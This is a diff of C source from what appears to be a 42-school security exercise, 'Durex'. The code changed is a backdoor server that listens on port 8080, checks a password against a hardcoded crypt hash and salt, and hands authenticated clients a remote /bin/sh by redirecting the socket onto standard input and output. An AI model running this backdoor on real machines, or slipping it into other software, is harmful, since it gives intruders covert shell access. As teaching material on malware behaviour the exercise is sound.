@@ -6,7 +6,7 @@
 /*   By: bccyv <bccyv@student.42.fr>                +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/11/15 19:41:10 by bccyv             #+#    #+#             */
-/*   Updated: 2021/11/16 19:16:55 by bccyv            ###   ########.fr       */
+/*   Updated: 2021/11/22 20:45:38 by bccyv            ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -17,12 +17,12 @@
 #include <arpa/inet.h>
 #include <durex.h>
 #include <stdio.h>
-#include <bcrypt.h>
 
 #define MAX_CLI_NUMBER 3
-#define PORT 4242
+#define PORT 8080
 #define BUF_SIZE 32
-#define PASSWORD_HASH "4242\n"
+#define PASSWORD_HASH "42ObwopjuwAYY"
+#define SALT "42"
 
 /*
  * Disconnects a client and returns his connection fd.
@@ -50,11 +50,10 @@ void spawn_shell(int confd, int sockfd)
 			if (i != confd && i != sockfd)
 				close(i);
 		}
-		for (int i = 0; i < 3; i++)
-	    {
-	        dup2(confd, i);
-	    }
-	    execve("/bin/sh", NULL, NULL);
+		dup2(confd, 0);
+		dup2(confd, 1);
+		dup2(confd, 2);
+		execve("/bin/sh", NULL, NULL);
 		exit(EXIT_FAILURE);
 	}
 }
@@ -108,6 +107,21 @@ int accept_new_connection(int sockfd, t_cli *clients, size_t clients_size)
 	return (-1);
 }
 
+static int checkpass(char *buf, const char *salt, const char *hashref)
+{
+	char *hash;
+	char *tmp = buf;
+
+	if (buf == NULL || hashref == NULL)
+		return (-1);
+	while (*tmp && *tmp != '\n')
+		tmp++;
+	*tmp = '\0';
+	hash = crypt(buf, salt);
+	printf("hash: %s\n", hash);
+	return (strcmp(hash, hashref) == 0);
+}
+
 /*
  *
 */
@@ -124,7 +138,7 @@ int read_from_client(t_cli *client, int sockfd)
 	// if (msg_len == BUF_SIZE)
 	// 	sock_flush(client.confd);
 
-	if (bcrypt_checkpass(buf, PASSWORD_HASH))
+	if (checkpass(buf, SALT, PASSWORD_HASH))
 	{
 		printf("coucou\n");
 		spawn_shell(client->confd, sockfd);
@@ -134,7 +148,9 @@ int read_from_client(t_cli *client, int sockfd)
 }
 
 /*
- *
+ *	Server core function.
+ *	Uses select I/O multiplexer to accept at most MAX_CLI_NUMBER simultaneous
+ *	connections.
 */
 int serve(int sockfd)
 {
@@ -150,7 +166,7 @@ int serve(int sockfd)
 		rtmp = rset;
 		wtmp = wset;
 
-		// remove prompted clients for password from tmp write set
+		// Remove prompted clients for password from tmp write set
 		for (int i = 0; i < MAX_CLI_NUMBER; i++)
 		{
 			if (clients[i].is_typing)
@@ -203,7 +219,10 @@ int serve(int sockfd)
 }
 
 /*
- *
+ *	This program will:
+ *	1. Init and listen on a socket.
+ *	2. Ask for a password to clients infinitely.
+ *	3. Spawn a shell to logged clients.
 */
 int main(void)
 {
@@ -212,9 +231,7 @@ int main(void)
 	sockfd = sock_init(PORT);
 	if (sockfd < 0)
 		exit(EXIT_FAILURE);
-
 	serve(sockfd);
-
 	close(sockfd);
 	return (0);
 }
